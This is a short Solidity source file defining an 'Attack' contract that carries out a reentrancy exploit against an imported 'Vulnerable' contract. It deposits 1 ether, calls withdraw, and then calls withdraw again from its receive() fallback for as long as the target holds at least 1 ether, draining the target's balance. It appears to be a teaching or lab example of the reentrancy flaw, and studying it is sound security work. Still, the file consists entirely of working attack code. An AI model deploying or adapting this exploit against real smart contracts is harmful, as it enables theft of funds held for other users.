import "./Vulnerable.sol";

contract Attack {
    Vulnerable public vulnerable;

    constructor(address vulnerableAddress) {
        vulnerable = Vulnerable(vulnerableAddress);
    }

    function attack() external payable {
        vulnerable.deposit{value: 1 ether}();
        vulnerable.withdraw();
    }

    receive() external payable {
        if (address(vulnerable).balance >= 1 ether) {
            vulnerable.withdraw();
        }
    }
}
